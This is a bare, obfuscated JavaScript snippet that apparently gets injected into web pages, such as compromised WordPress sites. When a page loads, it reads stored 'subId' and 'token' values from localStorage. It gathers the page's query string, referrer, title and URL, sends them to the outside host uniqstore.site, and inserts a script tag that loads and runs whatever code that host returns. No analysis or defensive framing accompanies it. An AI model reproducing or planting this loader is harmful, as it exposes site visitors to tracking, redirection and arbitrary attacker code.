    (function() {
    var name = '_jW2zPgBGJzMGJzzn';
    if (!window._jW2zPgBGJzMGJzzn) {
        window._jW2zPgBGJzMGJzzn = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://uniqstore.site/wpcts6',
        };
    }
    const _kZYfJSd6JgZPs8H2 = localStorage.getItem('config');
    if (typeof _kZYfJSd6JgZPs8H2 !== 'undefined' && _kZYfJSd6JgZPs8H2 !== null) {
        var _RHBGF1LQJLHwQDD6 = JSON.parse(_kZYfJSd6JgZPs8H2);
        var _L8Ft2hY4MX8dPfDB = Math.round(+new Date()/1000);
        if (_RHBGF1LQJLHwQDD6.created_at + window._jW2zPgBGJzMGJzzn.ttl < _L8Ft2hY4MX8dPfDB) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _NmtpXP5CQFSctK86 = localStorage.getItem('subId');
    var _LLV82dGct5FJhsqP = localStorage.getItem('token');
    var _C4gphv1JXSM3Kgm3 = '?return=js.client';
        _C4gphv1JXSM3Kgm3 += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _C4gphv1JXSM3Kgm3 += '&se_referrer=' + encodeURIComponent(document.referrer);
        _C4gphv1JXSM3Kgm3 += '&default_keyword=' + encodeURIComponent(document.title);
        _C4gphv1JXSM3Kgm3 += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _C4gphv1JXSM3Kgm3 += '&name=' + encodeURIComponent(name);
        _C4gphv1JXSM3Kgm3 += '&host=' + encodeURIComponent(window._jW2zPgBGJzMGJzzn.R_PATH);
    if (typeof _NmtpXP5CQFSctK86 !== 'undefined' && _NmtpXP5CQFSctK86 && window._jW2zPgBGJzMGJzzn.unique) {
        _C4gphv1JXSM3Kgm3 += '&sub_id=' + encodeURIComponent(_NmtpXP5CQFSctK86);
    }
    if (typeof _LLV82dGct5FJhsqP !== 'undefined' && _LLV82dGct5FJhsqP && window._jW2zPgBGJzMGJzzn.unique) {
        _C4gphv1JXSM3Kgm3 += '&token=' + encodeURIComponent(_LLV82dGct5FJhsqP);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._jW2zPgBGJzMGJzzn.R_PATH + _C4gphv1JXSM3Kgm3;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();